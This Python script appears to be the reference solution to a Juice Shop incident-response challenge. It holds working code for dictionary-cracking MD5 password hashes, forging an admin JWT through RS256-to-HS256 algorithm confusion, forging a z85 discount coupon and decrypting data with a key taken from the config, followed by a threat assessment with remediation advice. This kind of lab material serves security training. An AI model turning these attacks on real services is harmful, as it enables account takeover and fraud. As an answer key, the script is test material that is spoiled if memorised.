#!/usr/bin/env python3
"""
Solve the Juice Shop incident response challenge.

Performs: MD5 hash cracking, JWT algorithm confusion attack,
z85 coupon code forgery, AES-256-CBC decryption, GDPR analysis,
and threat assessment creation.
"""


import base64
import hashlib
import hmac
import json
import os
import sqlite3
import struct
import time

from Crypto.Cipher import AES

# ──────────────────────────────────────────────────────────────────────
# Constants
# ──────────────────────────────────────────────────────────────────────

INCIDENT = '/app/incident'
RESULTS = '/app/results'

Z85_CHARS = ("0123456789abcdefghijklmnopqrstuvwxyz"
             "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
             ".-:+=^!/*?&<>()[]{}@%$#")

Z85_MAP = {c: i for i, c in enumerate(Z85_CHARS)}

# Common password dictionary for MD5 cracking.
# Includes generic common passwords plus themed passwords that appear
# in web-app security training contexts (Star Trek refs, Futurama refs,
# hacker culture, etc.).
WORDLIST = [
    # Top common passwords
    'password', '123456', '12345678', 'qwerty', 'abc123',
    'monkey', 'master', 'dragon', 'login', 'admin',
    'admin123', 'letmein', 'welcome', 'password1', 'test',
    'pass', 'changeme', 'default', 'root', 'guest',
    'toor', 'secret', 'shadow', 'sunshine', 'trustno1',
    'iloveyou', '1234567', 'password123', 'qwerty123',
    'football', 'baseball', 'soccer', 'hockey',
    '123456789', '1234567890', '000000',
    'access', 'batman', 'michael', 'superman',
    'ashley', 'jessica', 'charlie', 'daniel',
    '123123', 'solo', 'starwars', 'princess',
    'passw0rd', 'hello', 'robert', 'thomas',
    'jordan', 'andrew', 'harley', 'whatever',
    'pepper', 'ginger', 'joshua', 'hunter',
    'tigger', 'buster', 'cookie', 'george',
    'matrix', 'cyber', 'hacker', 'p@ssw0rd',
    # Star Trek themed
    'ncc-1701', 'ncc-1701-D', 'NCC-1701', 'enterprise',
    'mcc-1701', 'kirk', 'spock', 'scotty', 'bones',
    'picard', 'warp', 'phasers', 'federation',
    # Futurama themed
    'Mr. N00dles', 'mr. n00dles', 'MrN00dles', 'fry',
    'leela', 'bender', 'zoidberg', 'farnsworth',
    'slurmCl4ssic', 'slurm', 'nibbler',
    'K1fBl4!Bl4!', 'kif',
    # Hacker culture
    'i am root', 'iamroot', 'I am root',
    'OhG0dPlease1teleworK!', 'leet', '1337',
    'h4cker', 'pwned', 'exploit', 'shellcode',
    'buffer', 'overflow', 'injection', 'xss',
    # Mixed complexity
    'mD84i3rG!x', 'J6aVjTgOpRs@ZJl!Kt#9',
    'P@ssword1', 'Tr0ub4dor&3', 'correct horse battery staple',
    'god', 'love', 'sex', 'money', 'mustang',
    'ranger', 'dallas', 'austin', 'biteme',
]


# ──────────────────────────────────────────────────────────────────────
# Z85 encode/decode
# ──────────────────────────────────────────────────────────────────────

def z85_encode(data):
    """Z85-encode binary data (ZeroMQ RFC 32)."""
    padding = (4 - len(data) % 4) % 4
    data = data + b'\x00' * padding
    result = []
    for i in range(0, len(data), 4):
        value = struct.unpack('>I', data[i:i + 4])[0]
        chars = []
        for _ in range(5):
            chars.append(Z85_CHARS[value % 85])
            value //= 85
        result.extend(reversed(chars))
    return ''.join(result)


def z85_decode(s):
    """Decode a z85-encoded string to bytes."""
    result = bytearray()
    for i in range(0, len(s), 5):
        value = 0
        for j in range(5):
            value = value * 85 + Z85_MAP[s[i + j]]
        result.extend(struct.pack('>I', value))
    return bytes(result)


# ──────────────────────────────────────────────────────────────────────
# Base64url helpers
# ──────────────────────────────────────────────────────────────────────

def base64url_encode(data):
    """Base64url encode without padding."""
    if isinstance(data, str):
        data = data.encode()
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode()


def base64url_decode(s):
    """Base64url decode with padding restoration."""
    s += '=' * (4 - len(s) % 4)
    return base64.urlsafe_b64decode(s)


# ──────────────────────────────────────────────────────────────────────
# Task 1: Crack MD5 password hashes
# ──────────────────────────────────────────────────────────────────────

def crack_passwords():
    """Crack MD5 password hashes using a dictionary attack."""
    conn = sqlite3.connect(f'{INCIDENT}/juiceshop.sqlite')
    users = conn.execute(
        'SELECT email, password, role FROM Users'
    ).fetchall()
    conn.close()

    # Pre-compute MD5 lookup table from wordlist
    md5_lookup = {}
    for word in WORDLIST:
        h = hashlib.md5(word.encode()).hexdigest()
        md5_lookup[h] = word

    cracked = []
    for email, pw_hash, role in users:
        # Skip bcrypt hashes (start with $2)
        if pw_hash.startswith('$2'):
            continue
        if pw_hash in md5_lookup:
            cracked.append({
                'email': email,
                'password': md5_lookup[pw_hash],
                'role': role,
            })

    return cracked


# ──────────────────────────────────────────────────────────────────────
# Task 2: JWT algorithm confusion attack (RS256 -> HS256)
# ──────────────────────────────────────────────────────────────────────

def forge_jwt():
    """Forge a JWT using HS256 with the RSA public key as HMAC secret."""
    # Read the captured JWT to learn the expected payload structure
    with open(f'{INCIDENT}/captured_jwt.txt') as f:
        captured = f.read().strip()

    parts = captured.split('.')
    original_payload = json.loads(base64url_decode(parts[1]))

    # Read the RSA public key
    with open(f'{INCIDENT}/public.pem') as f:
        public_key = f.read()

    # Build forged JWT
    header = {"alg": "HS256", "typ": "JWT"}

    now = int(time.time())
    payload = {
        "status": "success",
        "data": {
            "id": 0,
            "username": "",
            "email": "rsa_lord@juice-sh.op",
            "password": hashlib.md5(b"rsa_lord").hexdigest(),
            "role": "admin",
            "deluxeToken": "",
            "lastLoginIp": "0.0.0.0",
            "profileImage": "assets/public/images/uploads/default.svg",
            "totpSecret": "",
            "isActive": True,
            "createdAt": "2024-01-01T00:00:00.000Z",
            "updatedAt": "2024-01-01T00:00:00.000Z",
            "deletedAt": None,
        },
        "iat": now,
        "exp": now + 86400,
    }

    header_b64 = base64url_encode(json.dumps(header, separators=(',', ':')))
    payload_b64 = base64url_encode(json.dumps(payload, separators=(',', ':')))
    signing_input = f"{header_b64}.{payload_b64}"

    # Sign with HMAC-SHA256 using the PUBLIC KEY content as the secret
    sig = hmac.new(
        public_key.encode(), signing_input.encode(), hashlib.sha256
    ).digest()
    sig_b64 = base64url_encode(sig)

    return f"{header_b64}.{payload_b64}.{sig_b64}"


# ──────────────────────────────────────────────────────────────────────
# Task 3: Forge a coupon code (z85 encoding)
# ──────────────────────────────────────────────────────────────────────

def forge_coupon():
    """Reverse-engineer coupon encoding from historical samples and forge one."""
    # Verify z85 dependency exists
    with open(f'{INCIDENT}/package.json.bak') as f:
        pkg = json.load(f)
    assert 'z85' in pkg.get('dependencies', {}), "z85 dependency not found"

    # Decode a sample coupon to verify format
    with open(f'{INCIDENT}/coupon_backup.csv') as f:
        lines = f.readlines()

    sample_code = lines[1].split(',')[0]  # First data row
    decoded = z85_decode(sample_code).decode('ascii').rstrip('\x00')
    parts = decoded.split('-')
    assert len(parts) == 2, f"Unexpected format: {decoded}"

    # Forge coupon for June 2026, 80% discount
    coupon_plain = 'JUN26-80'
    return z85_encode(coupon_plain.encode())


# ──────────────────────────────────────────────────────────────────────
# Task 4: Identify GDPR-violating soft deletes
# ──────────────────────────────────────────────────────────────────────

def find_deleted_accounts():
    """Find accounts that were soft-deleted instead of truly erased."""
    conn = sqlite3.connect(f'{INCIDENT}/juiceshop.sqlite')
    rows = conn.execute(
        'SELECT email, deletedAt FROM Users WHERE deletedAt IS NOT NULL'
    ).fetchall()
    conn.close()

    return [{'email': email, 'deletedAt': dt} for email, dt in rows]


# ──────────────────────────────────────────────────────────────────────
# Task 5: Decrypt AES-256-CBC encrypted progress
# ──────────────────────────────────────────────────────────────────────

def decrypt_progress():
    """Decrypt hacking progress data using key from app configuration."""
    with open(f'{INCIDENT}/app_config.json') as f:
        config = json.load(f)

    ctf_key = config['challenges']['ctfKey']
    aes_key = hashlib.sha256(ctf_key.encode()).digest()

    with open(f'{INCIDENT}/encrypted_progress.b64') as f:
        raw = base64.b64decode(f.read().strip())

    iv = raw[:16]
    ciphertext = raw[16:]

    cipher = AES.new(aes_key, AES.MODE_CBC, iv)
    padded = cipher.decrypt(ciphertext)

    # Remove PKCS7 padding
    pad_len = padded[-1]
    plaintext = padded[:-pad_len]

    return json.loads(plaintext.decode())


# ──────────────────────────────────────────────────────────────────────
# Task 6: Create threat assessment
# ──────────────────────────────────────────────────────────────────────

def create_threat_assessment():
    """Evaluate all discovered vulnerabilities and produce a threat assessment."""
    assessment = {
        "findings": [
            {
                "title": "Weak Password Hashing (MD5)",
                "severity": "critical",
                "attack_complexity": "Low. MD5 is a fast, non-salted hash. "
                    "Dictionary and rainbow table attacks can reverse "
                    "MD5 hashes in seconds, even for moderately complex "
                    "passwords. No specialized hardware is required.",
                "business_impact": "Complete account takeover for all users "
                    "with MD5-hashed passwords, including administrator "
                    "accounts. Enables unauthorized access to sensitive "
                    "customer data, order history, and administrative "
                    "functions. Credential reuse across services amplifies "
                    "the blast radius.",
                "remediation": "Migrate all password hashes to bcrypt with "
                    "a minimum work factor of 12. Implement a forced "
                    "password reset for all affected accounts. Add password "
                    "complexity requirements and breach-password checking."
            },
            {
                "title": "JWT Algorithm Confusion (RS256 to HS256)",
                "severity": "critical",
                "attack_complexity": "Medium. Requires knowledge of the "
                    "algorithm confusion class of JWT vulnerabilities and "
                    "access to the RSA public key (which is exposed in the "
                    "application artifacts). The jsonwebtoken 0.4.0 library "
                    "does not enforce algorithm restrictions during "
                    "verification, allowing the attacker to switch from "
                    "RS256 to HS256 and sign with the public key.",
                "business_impact": "Complete authentication bypass. An "
                    "attacker can forge valid tokens for any user identity, "
                    "including administrators, gaining full access to all "
                    "application functionality. This undermines the entire "
                    "authentication and authorization model.",
                "remediation": "Upgrade the jsonwebtoken library to a "
                    "current version (>=9.x) that enforces algorithm "
                    "whitelisting. Explicitly specify allowed algorithms in "
                    "JWT verification configuration. Reject tokens whose "
                    "header algorithm does not match the expected value."
            },
            {
                "title": "Reversible Coupon Code Encoding",
                "severity": "high",
                "attack_complexity": "Medium. Requires identifying the z85 "
                    "encoding scheme from the application's dependency list "
                    "and reverse-engineering the coupon format (MMMYY-PP) "
                    "from historical coupon data. Once the scheme is "
                    "understood, arbitrary coupons can be generated trivially.",
                "business_impact": "Unlimited generation of arbitrary "
                    "discount coupons causing direct financial losses. "
                    "Attackers can create coupons with discounts up to 100%, "
                    "effectively obtaining products for free. At scale this "
                    "could cause significant revenue loss.",
                "remediation": "Replace the client-side coupon encoding with "
                    "server-side cryptographically signed coupon tokens "
                    "(e.g., HMAC-SHA256 signed). Validate all coupons "
                    "against a server-side allowlist with usage limits and "
                    "expiration enforcement."
            },
            {
                "title": "Incomplete Data Erasure (GDPR Non-Compliance)",
                "severity": "high",
                "attack_complexity": "Low. Soft-deleted records remain fully "
                    "intact in the database and are discoverable via simple "
                    "SQL queries. No special tools or techniques are needed "
                    "beyond database read access.",
                "business_impact": "Regulatory non-compliance with GDPR "
                    "Article 17 (Right to Erasure). Exposes the organization "
                    "to fines of up to 4% of annual global turnover or "
                    "EUR 20 million. Deleted users' personal data including "
                    "email addresses and account metadata remains accessible.",
                "remediation": "Implement hard deletion for user data erasure "
                    "requests. Add a data retention audit to verify complete "
                    "removal. Implement an erasure verification workflow and "
                    "maintain deletion audit logs for compliance reporting."
            },
            {
                "title": "Insecure Encryption Key Management",
                "severity": "high",
                "attack_complexity": "Low. The encryption key is stored in "
                    "plaintext in the application configuration file "
                    "alongside the algorithm and key derivation parameters. "
                    "Anyone with read access to the config can decrypt all "
                    "protected data.",
                "business_impact": "Complete compromise of all encrypted "
                    "application data. CTF progress tracking and potentially "
                    "other encrypted artifacts are fully recoverable. "
                    "Undermines any data-at-rest encryption guarantees.",
                "remediation": "Move encryption keys to a dedicated secrets "
                    "management system (e.g., HashiCorp Vault, AWS KMS). "
                    "Remove plaintext keys from configuration files. "
                    "Implement key rotation procedures and audit key access."
            }
        ],
        "overall_risk_score": 9,
        "prioritized_order": [
            "JWT Algorithm Confusion (RS256 to HS256)",
            "Weak Password Hashing (MD5)",
            "Insecure Encryption Key Management",
            "Incomplete Data Erasure (GDPR Non-Compliance)",
            "Reversible Coupon Code Encoding"
        ]
    }
    return assessment


# ──────────────────────────────────────────────────────────────────────
# Main
# ──────────────────────────────────────────────────────────────────────

def main():
    os.makedirs(RESULTS, exist_ok=True)

    # Task 1: Crack passwords
    print("[*] Cracking MD5 password hashes...")
    creds = crack_passwords()
    with open(f'{RESULTS}/cracked_credentials.json', 'w') as f:
        json.dump(creds, f, indent=2)
    print(f"    Cracked {len(creds)} accounts")

    # Task 2: Forge JWT
    print("[*] Forging JWT via algorithm confusion...")
    token = forge_jwt()
    with open(f'{RESULTS}/forged_token.txt', 'w') as f:
        f.write(token)
    print(f"    Token length: {len(token)}")

    # Task 3: Forge coupon
    print("[*] Forging coupon code...")
    coupon = forge_coupon()
    with open(f'{RESULTS}/forged_coupon.txt', 'w') as f:
        f.write(coupon)
    print(f"    Coupon: {coupon}")

    # Task 4: Find deleted accounts
    print("[*] Identifying soft-deleted accounts...")
    deleted = find_deleted_accounts()
    with open(f'{RESULTS}/deleted_accounts.json', 'w') as f:
        json.dump(deleted, f, indent=2)
    print(f"    Found {len(deleted)} soft-deleted accounts")

    # Task 5: Decrypt progress
    print("[*] Decrypting hacking progress...")
    progress = decrypt_progress()
    with open(f'{RESULTS}/decrypted_progress.json', 'w') as f:
        json.dump(progress, f, indent=2)
    print(f"    Solved challenges: {len(progress.get('solvedChallenges', []))}")

    # Task 6: Create threat assessment
    print("[*] Creating threat assessment...")
    assessment = create_threat_assessment()
    with open(f'{RESULTS}/threat_assessment.json', 'w') as f:
        json.dump(assessment, f, indent=2)
    print(f"    Findings: {len(assessment['findings'])}")
    print(f"    Overall risk score: {assessment['overall_risk_score']}")

    print("\n[+] All tasks completed. Results in /app/results/")


if __name__ == '__main__':
    main()
